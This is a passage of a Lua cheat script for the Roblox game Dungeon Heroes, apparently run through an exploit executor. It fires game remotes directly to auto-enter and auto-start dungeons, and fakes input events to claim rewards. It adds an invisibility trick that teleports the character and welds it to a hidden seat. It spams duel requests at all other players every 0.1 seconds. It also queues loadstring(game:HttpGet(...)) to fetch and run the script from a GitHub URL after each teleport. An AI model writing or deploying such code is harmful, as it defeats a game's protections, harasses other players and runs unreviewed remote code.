                Sub.Size = UDim2.new(1, -34, 0, 20)
                Sub.Position = UDim2.new(0, 22, 0, 31)
                Sub.BackgroundTransparency = 1
                Sub.Font = Enum.Font.GothamMedium
                Sub.TextSize = 12
                Sub.TextColor3 = Color3.fromRGB(220, 225, 235)
                Sub.TextXAlignment = Enum.TextXAlignment.Left
                Sub.TextTruncate = Enum.TextTruncate.AtEnd
                Sub.Text = tostring(SubText)
                Sub.Parent = MainFrame

                local BarBg = Instance.new("Frame")
                BarBg.Size = UDim2.new(1, 0, 0, 3)
                BarBg.Position = UDim2.new(0, 0, 1, -3)
                BarBg.BackgroundColor3 = Color3.fromRGB(35, 40, 52)
                BarBg.BorderSizePixel = 0
                BarBg.Parent = MainFrame

                local BarFill = Instance.new("Frame")
                BarFill.Size = UDim2.new(1, 0, 1, 0)
                BarFill.BackgroundColor3 = ThemeColor
                BarFill.BorderSizePixel = 0
                BarFill.Parent = BarBg

                TweenService:Create(
                    MainFrame,
                    TweenInfo.new(0.30, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                    {Position = UDim2.new(0.5, -200, 0, 16)}
                ):Play()

                TweenService:Create(
                    BarFill,
                    TweenInfo.new(ShowTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
                    {Size = UDim2.new(0, 0, 1, 0)}
                ):Play()

                task.wait(ShowTime)

                if MainFrame and MainFrame.Parent then
                    local OutTween = TweenService:Create(
                        MainFrame,
                        TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                        {Position = UDim2.new(0.5, -200, 0, -85)}
                    )
                    OutTween:Play()
                    OutTween.Completed:Wait()
                    if ScreenGui then ScreenGui:Destroy() end
                end
            end)
        end)
    end

    -- ==========================================
    -- STATE & SETTINGS
    -- ==========================================
    local Category = "All"
    local SelectedDungeon = nil
    local SelectedDifficulty = nil

    local MaxPartyPlayers = 1       -- Slider controlled (Default = 1)
    local IsPrivateParty = true     -- Private / Solo Queue
    local AutoEnterFromLobby = false
    local AutoStartDungeon = true
    local Entering = false

    local DungeonOptions = {}
    local DifficultyOptions = {}
    local DungeonNameToKey = {}

    local DungeonDropdown
    local DifficultyDropdown

    local function GetValue(value)
        return type(value) == "table" and value[1] or value
    end

    -- ==========================================
    -- READ PLAYER'S IN-GAME SAVED MODIFIERS
    -- (From Profile.DungeonModifierConfigs)
    -- ==========================================
    local function GetSavedInGameModifiers(dungeonKey)
        if not dungeonKey then return nil end

        local Profile = nil
        pcall(function()
            Profile = ProfileSystem:GetProfile(Player)
        end)
        if not Profile then return nil end

        local ModConfigs = Profile:FindFirstChild("DungeonModifierConfigs")
        local DungeonConfig = ModConfigs and ModConfigs:FindFirstChild(dungeonKey)
        if not DungeonConfig then
            return nil -- No custom config folder -> server keeps default in-game state
        end

        local IsEnabled = DungeonConfig:GetAttribute("ModifiersEnabled") == true
        local IsRoulette = DungeonConfig:GetAttribute("RouletteEnabled") == true
        local EnabledMap = {}

        local EnabledFolder = DungeonConfig:FindFirstChild("EnabledModifiers")
        if EnabledFolder then
            for _, ModVal in ipairs(EnabledFolder:GetChildren()) do
                if ModVal:IsA("BoolValue") and ModVal.Value == true then
                    EnabledMap[ModVal.Name] = true
                end
            end
        end

        return {
            enabled = IsEnabled,
            enabledModifiers = EnabledMap,
            roulette = IsRoulette
        }
    end

    -- ==========================================
    -- CHECK IF DUNGEON / EVENT IS CURRENTLY ACTIVE
    -- ==========================================
    local function HasAnyAvailableDifficulty(dungeonKey, data)
        -- Gauntlet or special modes without standard DifficultyLevels table
        if data.IsGauntlet and type(data.DifficultyLevels) ~= "table" then
            return true
        end

        local levels = data and data.DifficultyLevels
        if type(levels) ~= "table" then
            return false
        end

        for index in pairs(levels) do
            if type(index) == "number" and Difficulties[index] then
                local ok, available = pcall(function()
                    return Dungeons:IsDungeonDifficultyAvailable(dungeonKey, index)
                end)
                if ok and available == true then
                    return true
                end
            end
        end

        return false
    end

    local function IsEventCurrentlyActive(dungeonKey, data)
        -- 1. Reject disabled / hidden / unreleased floors
        if data.Disabled == true
            or data.IsDisabled == true
            or data.Hidden == true
            or data.InDevelopment == true
            or data.Unreleased == true
            or data.IsActive == false then
            return false
        end

        -- 2. Check Locations:IsFloorAvailable if supported
        if type(Locations.IsFloorAvailable) == "function" then
            local ok1, avail1 = pcall(function()
                return Locations:IsFloorAvailable(dungeonKey)
            end)
            if ok1 and type(avail1) == "boolean" and avail1 == false then
                return false
            end

            local ok2, avail2 = pcall(function()
                return Locations:IsFloorAvailable(Player, dungeonKey)
            end)
            if ok2 and type(avail2) == "boolean" and avail2 == false then
                return false
            end
        end

        -- 3. Check EventsSystem if floor specifies an Event ID / Name
        local EventTag = data.Event or data.EventId or data.EventName or data.ActiveEvent
        if EventTag and EventsSystem then
            local Checked = false
            local IsLive = false

            for _, FnName in ipairs({"IsEventActive", "IsActive", "GetEventData"}) do
                if type(EventsSystem[FnName]) == "function" then
                    local okE, resE = pcall(function()
                        return EventsSystem[FnName](EventsSystem, EventTag)
                    end)
                    if okE and resE ~= nil then
                        Checked = true
                        IsLive = (resE ~= false and resE ~= nil)
                        break
                    end
                end
            end

            if Checked and not IsLive then
                return false
            end
        end

        -- 4. If it's an Event Dungeon, also verify against Profile.EventData if EventTag is present
        if data.IsEventDungeon == true and type(EventTag) == "string" and #EventTag > 0 then
            local Profile = nil
            pcall(function() Profile = ProfileSystem:GetProfile(Player) end)
            local EventDataFolder = Profile and Profile:FindFirstChild("EventData")
            if EventDataFolder and #EventDataFolder:GetChildren() > 0 then
                if not EventDataFolder:FindFirstChild(EventTag) then
                    return false
                end
            end
        end

        -- 5. Must have at least 1 currently playable difficulty on the server!
        if not HasAnyAvailableDifficulty(dungeonKey, data) then
            return false
        end

        return true
    end

    local function MatchesCategory(dungeonKey, data)
        -- Always filter out expired/unavailable events & locked dungeons
        if data.IsEventDungeon == true or Category == "Events" then
            if not IsEventCurrentlyActive(dungeonKey, data) then
                return false
            end
        else
            if data.Disabled == true or data.Hidden == true or data.InDevelopment == true then
                return false
            end
        end

        if Category == "All" then
            return true
        elseif Category == "Raids" then
            return data.IsRaid == true
        elseif Category == "Events" then
            return data.IsEventDungeon == true
        elseif Category == "Special" then
            return data.SpecialDungeon == true or data.IsGauntlet == true
        elseif Category == "Normal" then
            return data.IsDungeon == true
                and data.IsRaid ~= true
                and data.IsEventDungeon ~= true
                and data.SpecialDungeon ~= true
                and data.IsGauntlet ~= true
        end

        return false
    end

    -- ==========================================
    -- REFRESH DUNGEONS & DIFFICULTIES
    -- ==========================================
    local function RefreshDifficulties()
        table.clear(DifficultyOptions)
        SelectedDifficulty = nil

        local data = SelectedDungeon and Floors[SelectedDungeon]
        local levels = data and data.DifficultyLevels

        if type(levels) == "table" then
            local indexes = {}
            for index in pairs(levels) do
                if type(index) == "number" then
                    table.insert(indexes, index)
                end
            end
            table.sort(indexes)

            for _, index in ipairs(indexes) do
                local name = Difficulties[index]
                local ok, available = pcall(function()
                    return Dungeons:IsDungeonDifficultyAvailable(SelectedDungeon, index)
                end)

                if name and ok and available then
                    table.insert(DifficultyOptions, name)
                end
            end
        end

        -- Auto-select highest available difficulty by default for convenience
        if #DifficultyOptions > 0 then
            SelectedDifficulty = DifficultyOptions[#DifficultyOptions]
            DifficultyDropdown:Refresh(DifficultyOptions, SelectedDifficulty)
        else
            DifficultyDropdown:Refresh({})
        end
    end

    local function RefreshDungeons()
        table.clear(DungeonOptions)
        table.clear(DungeonNameToKey)

        local entries = {}
        local titleCounts = {}

        for name, data in pairs(Floors) do
            if type(data) == "table"
                and (data.IsDungeon or data.IsRaid or data.IsEventDungeon or data.SpecialDungeon or data.IsGauntlet)
                and MatchesCategory(name, data) then

                local displayName = data.Title or name
                titleCounts[displayName] = (titleCounts[displayName] or 0) + 1

                table.insert(entries, {
                    Name = name,
                    Title = displayName,
                    Data = data
                })
            end
        end

        table.sort(entries, function(a, b)
            local da = a.Data
            local db = b.Data

            if da.IsRaid and db.IsRaid then
                local orderA = da.DungeonSelectZIndex or da.LayoutOrder or da.RequiredLevel or 999999
                local orderB = db.DungeonSelectZIndex or db.LayoutOrder or db.RequiredLevel or 999999
                if orderA ~= orderB then
                    return orderA < orderB
                end
            else
                local levelA = da.RequiredLevel or 999999
                local levelB = db.RequiredLevel or 999999
                if levelA ~= levelB then
                    return levelA < levelB
                end
            end

            return a.Title < b.Title
        end)

        for _, entry in ipairs(entries) do
            local displayName = entry.Title
            if titleCounts[displayName] > 1 then
                displayName = displayName .. " (" .. entry.Name .. ")"
            end

            table.insert(DungeonOptions, displayName)
            DungeonNameToKey[displayName] = entry.Name
        end

        SelectedDungeon = nil
        SelectedDifficulty = nil

        DungeonDropdown:Refresh(DungeonOptions)
        DifficultyDropdown:Refresh({})
    end

    -- ==========================================
    -- QUEUE & ENTER EXECUTION (PRESERVES MODIFIERS)
    -- ==========================================
    local function EnterSelectedDungeon()
        if Entering then return end

        if not SelectedDungeon or not SelectedDifficulty then
            ShowTopNotification(
                "Selection Missing!",
                "Pehle Dungeon aur Difficulty select karo.",
                Color3.fromRGB(255, 175, 40),
                3.0
            )
            return
        end

        local difficultyIndex = table.find(Difficulties, SelectedDifficulty)
        if not difficultyIndex then
            ShowTopNotification(
                "Invalid Difficulty!",
                "Difficulty index match nahi hua.",
                Color3.fromRGB(255, 90, 90),
                3.0
            )
            return
        end

        Entering = true

        local SavedModifiers = GetSavedInGameModifiers(SelectedDungeon)

        local success, err = pcall(function()
            -- 1. Submit Party Settings with Slider Player Count (MaxPartyPlayers)
            SetSettings:FireServer(
                SelectedDungeon,
                difficultyIndex,
                MaxPartyPlayers,
                IsPrivateParty,
                false,
                {}
            )

            -- 2. Only send SaveModifiers if we read the player's actual in-game config for THIS dungeon!
            -- Never overwrite with foreign raid modifiers!
            if SavedModifiers then
                SaveModifiers:FireServer(
                    SelectedDungeon,
                    SavedModifiers
                )
            end
        end)

        if not success then
            Entering = false
            warn("Entry Error:", err)
            ShowTopNotification("Entry Error!", tostring(err), Color3.fromRGB(255, 80, 80), 3.5)
            return
        end

        local ModStatus = (SavedModifiers and SavedModifiers.enabled) and "In-Game Modifiers: ON" or "In-Game Default"
        ShowTopNotification(
            string.format("Entering: %s (%s)", tostring(SelectedDungeon), tostring(SelectedDifficulty)),
            string.format("Players: %d | %s", MaxPartyPlayers, ModStatus),
            Color3.fromRGB(0, 230, 145),
            3.5
        )

        task.delay(12, function()
            Entering = false
        end)
    end

    -- ==========================================
    -- RAYFIELD UI CONTROLS
    -- ==========================================
    AutoGrindTab:CreateDropdown({
        Name = "Category",
        Options = {"All", "Normal", "Raids", "Events", "Special"},
        CurrentOption = {"All"},
        Callback = function(value)
            Category = GetValue(value)
            RefreshDungeons()
        end
    })

    DungeonDropdown = AutoGrindTab:CreateDropdown({
        Name = "Select Dungeon / Raid",
        Options = {},
        CurrentOption = {},
        Callback = function(value)
            local selected = GetValue(value)
            if type(selected) ~= "string" then return end

            SelectedDungeon = DungeonNameToKey[selected]
            if not SelectedDungeon then
                warn("Dungeon key not found:", selected)
                return
            end

            task.defer(function()
                RefreshDifficulties()
            end)
        end
    })

    DifficultyDropdown = AutoGrindTab:CreateDropdown({
        Name = "Select Difficulty",
        Options = {},
        CurrentOption = {},
        Callback = function(value)
            SelectedDifficulty = GetValue(value)
        end
    })

    AutoGrindTab:CreateSlider({
        Name = "Party Player Limit (Max Players)",
        Range = {1, 8},
        Increment = 1,
        Suffix = " Player(s)",
        CurrentValue = 1,
        Flag = "AutoEntryMaxPlayers",
        Callback = function(Value)
            MaxPartyPlayers = tonumber(Value) or 1
        end
    })

    AutoGrindTab:CreateToggle({
        Name = "Private / Friends Only Queue",
        CurrentValue = true,
        Flag = "AutoEntryPrivateToggle",
        Callback = function(Value)
            IsPrivateParty = Value
        end
    })

    AutoGrindTab:CreateButton({
        Name = "ENTER SELECTED DUNGEON",
        Callback = function()
            EnterSelectedDungeon()
        end
    })

    AutoGrindTab:CreateToggle({
        Name = "Auto Enter Dungeon When In Lobby",
        CurrentValue = false,
        Flag = "AutoEnterFromLobbyToggle",
        Callback = function(Value)
            AutoEnterFromLobby = Value
        end
    })

    AutoGrindTab:CreateToggle({
        Name = "Auto Start Dungeon",
        CurrentValue = true,
        Flag = "AutoStartDungeonToggle",
        Callback = function(value)
            AutoStartDungeon = value
        end
    })

    -- ==========================================
    -- SMART AUTO START & AUTO LOBBY QUEUE LOOP
    -- ==========================================
    local LastStartFireTime = 0
    local LastLobbyEnterTime = 0

    task.spawn(function()
        while task.wait(0.25) do
            local ok, locationName, locationData = pcall(function()
                return Locations:GetCurrentLocation()
            end)

            if not ok or type(locationData) ~= "table" then
                continue
            end

            local inDungeon = (
                locationData.IsDungeon == true
                or locationData.IsRaid == true
                or locationData.IsEventDungeon == true
                or locationData.IsGauntlet == true
                or locationData.SpecialDungeon == true
            )

            -- 1. Inside Dungeon: Fire TriggerStartDungeon until workspace attribute DungeonStarted is true
            if inDungeon and AutoStartDungeon then
                local AlreadyStarted = workspace:GetAttribute("DungeonStarted") == true
                local AlreadyCleared = workspace:GetAttribute("DungeonCleared") == true
                local AlreadyFailed = workspace:GetAttribute("DungeonFailed") == true

                if not AlreadyStarted and not AlreadyCleared and not AlreadyFailed then
                    if os.clock() - LastStartFireTime >= 1.2 then
                        LastStartFireTime = os.clock()
                        pcall(function()
                            TriggerStartDungeon:FireServer()
                        end)
                    end
                end

            -- 2. Inside Lobby: Auto-Enter Selected Dungeon if AutoEnterFromLobby is enabled
            elseif not inDungeon and AutoEnterFromLobby and not Entering then
                if SelectedDungeon and SelectedDifficulty and (os.clock() - LastLobbyEnterTime >= 8.0) then
                    LastLobbyEnterTime = os.clock()
                    task.spawn(EnterSelectedDungeon)
                end
            end
        end
    end)

    RefreshDungeons()
end

-- ==========================================
-- DUNGEON HEROES | AUTO NEXT & CLAIM ALL
-- ==========================================
do
    local Players = game:GetService("Players")
    local GuiService = game:GetService("GuiService")
    local VirtualInputManager = game:GetService("VirtualInputManager")
    local LocalPlayer = Players.LocalPlayer

    getgenv().AutoTapChestUI = false

    local function instantTapButton(btn)
        if not btn or not btn.Visible then return end

        -- 1. SelectedObject + Return Key
        pcall(function()
            btn.Selectable = true
            GuiService.SelectedObject = btn
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            GuiService.SelectedObject = nil
        end)

        -- 2. Signal Connections Fire
        if getconnections then
            local fakeTouchBegin = {UserInputType = Enum.UserInputType.Touch, UserInputState = Enum.UserInputState.Begin}
            local fakeTouchEnd = {UserInputType = Enum.UserInputType.Touch, UserInputState = Enum.UserInputState.End}

            local function fireSig(sig, a, b)
                for _, conn in pairs(getconnections(sig)) do
                    pcall(function() if conn.Fire then conn:Fire(a, b) end end)
                    pcall(function() if conn.Function then task.spawn(conn.Function, a, b) end end)
                end
            end

            fireSig(btn.Activated, fakeTouchBegin, 1)
            fireSig(btn.MouseButton1Click)
            fireSig(btn.MouseButton1Down, 0, 0)
            fireSig(btn.MouseButton1Up, 0, 0)
            if btn.TouchTap then fireSig(btn.TouchTap, {Vector2.zero}) end
            fireSig(btn.InputBegan, fakeTouchBegin, false)
            fireSig(btn.InputEnded, fakeTouchEnd, false)
        end

        -- 3. Screen Coordinates Tap Fallback
        pcall(function()
            local inset = GuiService:GetGuiInset()
            local pos = btn.AbsolutePosition
            local size = btn.AbsoluteSize
            local x = pos.X + (size.X / 2)
            local y = pos.Y + (size.Y / 2) + inset.Y

            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1)
        end)
    end

    AutoGrindTab:CreateToggle({
        Name = "Auto Next & Claim All",
        CurrentValue = false,
        Flag = "AutoTapChestUI",
        Callback = function(Value)
            getgenv().AutoTapChestUI = Value

            if Value then
                task.spawn(function()
                    while getgenv().AutoTapChestUI do
                        pcall(function()
                            local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
                            local chestOpen = playerGui and playerGui:FindFirstChild("ChestOpen")

                            if chestOpen and chestOpen.Enabled then
                                local overlay = chestOpen:FindFirstChild("Overlay")
                                local actionButtons = overlay and overlay:FindFirstChild("ActionButtons")

                                if actionButtons and overlay.Visible then
                                    for _, child in ipairs(actionButtons:GetChildren()) do
                                        if child.Name == "Button" and child:IsA("GuiObject") and child.Visible then
                                            for _, desc in ipairs(child:GetDescendants()) do
                                                if desc:IsA("TextLabel") or desc:IsA("TextButton") then
                                                    local txt = desc.Text
                                                    if txt == "Next" or txt == "Claim All" then
                                                        instantTapButton(child)
                                                        break
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end)
                        task.wait(0.05)
                    end
                end)
            end
        end
    })
end

-- ==========================================
-- DUNGEON HEROES | AUTO PLAY AGAIN
-- ==========================================
do
    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local TeleportService = game:GetService("TeleportService")
    local GuiService = game:GetService("GuiService")

    local Player = Players.LocalPlayer
    local Remote = RS:WaitForChild("Remotes"):WaitForChild("SetExitChoice")

    local Enabled = false
    local Busy = false

    local function IsDungeonCleared()
        if workspace:GetAttribute("DungeonCleared") == true then
            local gui = Player.PlayerGui:FindFirstChild("DungeonCleared")
            if gui and gui.Enabled then
                return true
            end
        end

        local gui = Player.PlayerGui:FindFirstChild("DungeonCleared")
        if not gui or not gui.Enabled then
            return false
        end

        local frame = gui:FindFirstChild("Frame")
        local cleared = frame and frame:FindFirstChild("Cleared")

        return frame and frame.Visible and cleared and cleared.Visible
    end

    TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
        if player == Player and Enabled then
            warn("Teleport Failed (" .. tostring(teleportResult) .. "): " .. tostring(errorMessage) .. " - Retrying GoAgain...")
            pcall(function()
                GuiService:ClearError()
            end)

            task.wait(4)
            pcall(function()
                Remote:FireServer("GoAgain")
            end)

            Busy = false
        end
    end)

    AutoGrindTab:CreateToggle({
        Name = "Auto Play Again",
        CurrentValue = false,
        Flag = "AutoPlayAgainToggle",
        Callback = function(value)
            Enabled = value

            if value then
                task.spawn(function()
                    while Enabled do
                        if not Busy and IsDungeonCleared() then
                            Busy = true

                            pcall(function()
                                GuiService:ClearError()
                            end)

                            local success, err = pcall(function()
                                Remote:FireServer("GoAgain")
                            end)

                            if not success then
                                warn("Play Again Error:", err)
                            end

                            task.wait(6)
                            Busy = false
                        end

                        task.wait(0.2)
                    end
                end)
            end
        end
    })
end

do -- << 'do' BLOCK (Safety Wrapper) >>

local Players = game:GetService("Players")  
local LocalPlayer = Players.LocalPlayer  
local Debris = game:GetService("Debris")  

-- ===== CONFIGURATION =====  
local INVIS_POS = Vector3.new(-25.95, 84, 3537.55)   
local SOUND_ID = "rbxassetid://942127495"  

-- ===== STATE =====  
local invisEnabled = false  -- 🔥 invis state remember karega  

-- ===== HELPER FUNCTIONS =====  

-- 1. Sound Function  
local function PlayToggleSound()  
    local sound = Instance.new("Sound")  
    sound.Name = "InvisSound"  
    sound.SoundId = SOUND_ID  
    sound.Volume = 1  
    sound.Parent = game:GetService("SoundService")  
    sound:Play()  
    Debris:AddItem(sound, 2)  
end  

-- 2. Transparency Handler  
local function SetVisualTransparency(val)  
    if LocalPlayer.Character then  
        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do  
            if part:IsA("BasePart") or part:IsA("Decal") then  
                if part.Name ~= "HumanoidRootPart" then  
                    part.Transparency = val  
                end  
            end  
        end  
    end  
end  

-- ===== MAIN LOGIC =====  

local function ApplyInvisToCharacter(char)  
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end  

    local hrp = char.HumanoidRootPart  
    local savedPos = hrp.CFrame  

    hrp.CFrame = CFrame.new(INVIS_POS)  
    task.wait(0.15)  

    local seat = Instance.new("Seat")  
    seat.Name = "InvisSeat"  
    seat.Anchored = false  
    seat.CanCollide = false  
    seat.Transparency = 1  
    seat.Position = INVIS_POS  
    seat.Parent = workspace  

    local weld = Instance.new("Weld")  
    weld.Part0 = seat  
    weld.Part1 = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")  
    weld.Parent = seat  

    task.wait(0.1)  
    seat.CFrame = savedPos  

    SetVisualTransparency(0.5)  
end  

local function RemoveInvis()  
    local seat = workspace:FindFirstChild("InvisSeat")  
    if seat then seat:Destroy() end  
    SetVisualTransparency(0)  
end  

local function ToggleInvisibility(State)  
    invisEnabled = State  

    local char = LocalPlayer.Character  
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end  

    PlayToggleSound()  

    if State then  
        ApplyInvisToCharacter(char)  
    else  
        RemoveInvis()  
    end  
end  

-- ===== UI =====  

MiscellaneousTab:CreateToggle({  
    Name = "👻 Invisible Mode",  
    CurrentValue = false,  
    Callback = function(Value)  
        ToggleInvisibility(Value)  
    end,  
})  

-- ===== AUTO RE-APPLY ON RESPAWN / LOBBY TP =====  

LocalPlayer.CharacterAdded:Connect(function(char)  
    task.wait(0.5) -- thoda wait taaki HRP load ho jaaye  
    if invisEnabled then  
        ApplyInvisToCharacter(char) -- 🔥 new round pe auto invis  
    else  
        RemoveInvis()  
    end  
end)  

Players.PlayerRemoving:Connect(function(plr)  
    if plr == LocalPlayer then  
        RemoveInvis()  
    end  
end)

end -- << END OF BLOCK >>

-- Dungeon Heroes | Disable VFX
-- Rayfield UI + Loader

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SetSetting = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("SetSetting")

MiscellaneousTab:CreateToggle({
Name = "Disable VFX",
CurrentValue = true,
Flag = "DisableVFX",

Callback = function(Value)  
    SetSetting:FireServer("DisableVFX", true)  
end

})

-- Automatically enforce TRUE
SetSetting:FireServer("DisableVFX", true)

-- Auto Duel | Fast Individual Requests

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

local DuelRemote = RS:WaitForChild("Remotes")
:WaitForChild("Duels/RequestDuel")

local AutoDuel = false
local Delay = 0.1

MiscellaneousTab:CreateToggle({
Name = "Auto Duel All Players",
CurrentValue = false,
Callback = function(Value)
AutoDuel = Value

if Value then  
        task.spawn(function()  
            while AutoDuel do  
                for _, player in ipairs(Players:GetPlayers()) do  
                    if not AutoDuel then  
                        break  
                    end  

                    if player ~= LocalPlayer then  
                        pcall(function()  
                            DuelRemote:FireServer(player.UserId)  
                        end)  

                        task.wait(Delay)  
                    end  
                end  

                task.wait(Delay)  
            end  
        end)  
    end  
end

})

-- Selected Player Auto Duel | Rayfield

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

local DuelRemote = RS:WaitForChild("Remotes")
:WaitForChild("Duels/RequestDuel")

local SearchText = ""
local SelectedDuel = false
local Delay = 0.1

-- Find matching player
local function FindPlayer(query)
query = string.lower(query)

if #query < 2 then  
    return nil  
end  

local matches = {}  

for _, player in ipairs(Players:GetPlayers()) do  
    if player ~= LocalPlayer then  

        local username = string.lower(player.Name)  
        local display = string.lower(player.DisplayName)  

        if string.find(username, query, 1, true)  
        or string.find(display, query, 1, true) then  
            table.insert(matches, player)  
        end  
    end  
end  

-- Avoid accidentally selecting the wrong player  
if #matches == 1 then  
    return matches[1]  
end  

return nil

end

-- Search box
MiscellaneousTab:CreateInput({
Name = "Player Username / DisplayName",
PlaceholderText = "Enter 2-3 letters...",
RemoveTextAfterFocusLost = false,
Callback = function(Value)
SearchText = Value

local target = FindPlayer(SearchText)  

    if target then  
        Rayfield:Notify({  
            Title = "Player Found",  
            Content = target.DisplayName ..  
                " (@" .. target.Name .. ")",  
            Duration = 3  
        })  
    end  
end

})

-- Selected Duel Toggle
MiscellaneousTab:CreateToggle({
Name = "Selected Player Duel",
CurrentValue = false,
Callback = function(Value)
SelectedDuel = Value

if Value then  
        task.spawn(function()  
            while SelectedDuel do  

                local target = FindPlayer(SearchText)  

                if target and target.Parent == Players then  
                    pcall(function()  
                        DuelRemote:FireServer(target.UserId)  
                    end)  
                end  

                task.wait(Delay)  
            end  
        end)  
    end  
end

})

-- ==========================================
-- AUTO EXECUTE ON TELEPORT & CONFIG LOADER
-- ==========================================
MiscellaneousTab:CreateSection("Auto Execute Settings")

local AutoExecEnabled = true
local TeleportQueued = false

-- Yahan apni is પૂरी script ka Raw Link (Pastefy/GitHub) dalein:
local SCRIPT_URL = "https://raw.githubusercontent.com/golu321-xd/Dungeon-Heros/refs/heads/main/Dungeon%20heroes.lua"

local queueTeleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)

local function SetupTeleportQueue()
if queueTeleport and AutoExecEnabled and not TeleportQueued then
TeleportQueued = true
pcall(function()
queueTeleport('loadstring(game:HttpGet("' .. SCRIPT_URL .. '"))()')
end)
end
end

-- Toggle in Miscellaneous Tab (Default: ON)
MiscellaneousTab:CreateToggle({
Name = "Auto Execute (Same Game TP)",
CurrentValue = true,
Flag = "AutoExecToggle",
Callback = function(Value)
AutoExecEnabled = Value
end,
})

-- Jab player ek hi experience mein teleport hoga (Lobby -> Dungeon -> Lobby)
player.OnTeleport:Connect(function(State)
if AutoExecEnabled then
SetupTeleportQueue()
end
end)

-- Sabse last mein pichli saved settings (Speed, Toggles, Sliders) wapas load karega
Rayfield:LoadConfiguration()
